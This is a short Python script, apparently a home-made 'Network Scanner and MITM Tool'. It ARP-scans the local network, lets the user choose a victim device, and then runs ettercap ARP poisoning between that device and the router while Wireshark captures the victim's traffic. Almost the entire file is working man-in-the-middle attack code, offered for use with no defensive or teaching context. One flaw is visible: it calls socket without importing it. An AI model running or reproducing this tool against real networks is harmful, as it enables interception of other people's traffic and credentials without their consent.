#!/usr/bin/env python3
import subprocess
import os
import argparse
from scapy.all import ARP, Ether, srp, conf
from colorama import Fore

def get_network_interfaces():
    interfaces = os.listdir('/sys/class/net/')
    return interfaces

def get_my_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        print(f"Error: {e}")
        return None

loc = get_my_local_ip()

def get_local_ip(interface):
    ip_result = subprocess.check_output(f"ip -4 addr show {interface} | grep inet", shell=True).decode()
    local_ip = ip_result.strip().split()[1].split('/')[0]
    return local_ip

def scan_network(ip_range, interface):
    conf.verb = 0
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, iface=interface, inter=0.1)[0]

    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    return devices

def get_default_gateway():
    route_result = subprocess.check_output("ip route | grep default", shell=True).decode()
    gateway_ip = route_result.split()[2]
    return gateway_ip

parser = argparse.ArgumentParser(description='Network Scanner and MITM Tool')
parser.add_argument('target', nargs='?', type=str, help='IP address of the target device (optional)')
args = parser.parse_args()

interfaces = get_network_interfaces()
os.system('clear')
for idx, iface in enumerate(interfaces):
    print(Fore.YELLOW + f'{idx}' + ' ' + Fore.LIGHTGREEN_EX + f'{iface}' + Fore.RESET)

interface_idx = int(input("Select the network interface by number: "))
print('\n')
interface = interfaces[interface_idx]

local_ip = get_local_ip(interface)
ip_range = '.'.join(local_ip.split('.')[:-1]) + '.1/24'

if args.target:
    target_ip = args.target
    router_ip = get_default_gateway()
else:
    devices = scan_network(ip_range, interface)

    router_ip = get_default_gateway()
    devices = [device for device in devices if device['ip'] != router_ip]

    for idx, device in enumerate(devices):
        print(Fore.YELLOW + f'{idx}' + Fore.LIGHTBLUE_EX + ' ' + f'{device["ip"]}' + Fore.GREEN + ' ' + f'{device["mac"]}' + Fore.RESET)
    print('\n')

    target_idx = int(input("Select the target device by number: "))
    target_ip = devices[target_idx]['ip']

os.system('clear')
print(Fore.LIGHTGREEN_EX + 'Running MITM Attack & Capturing The Traffic ' + Fore.CYAN + '@ ' + Fore.YELLOW + str(target_ip) + Fore.RESET)
print(Fore.LIGHTBLUE_EX + 'Router: ' + Fore.YELLOW + str(router_ip) + Fore.RESET)
print(Fore.LIGHTBLUE_EX + 'Target: ' + Fore.YELLOW + str(target_ip) + Fore.RESET)
print('\n')
print(f"{Fore.LIGHTRED_EX}    Victim      <----->     Attacker     <----->     Router")
print(f"{Fore.YELLOW}  {target_ip}             {local_ip}              {router_ip}" + Fore.RESET)

ettercap_process = subprocess.Popen(f"ettercap -T -S -i {interface} -M arp:remote /{router_ip}// /{target_ip}//", shell=True)
wireshark_process = subprocess.Popen(f"wireshark -i {interface} -k -Y 'ip.addr == {target_ip}'", shell=True)

ettercap_process.wait()
wireshark_process.wait()
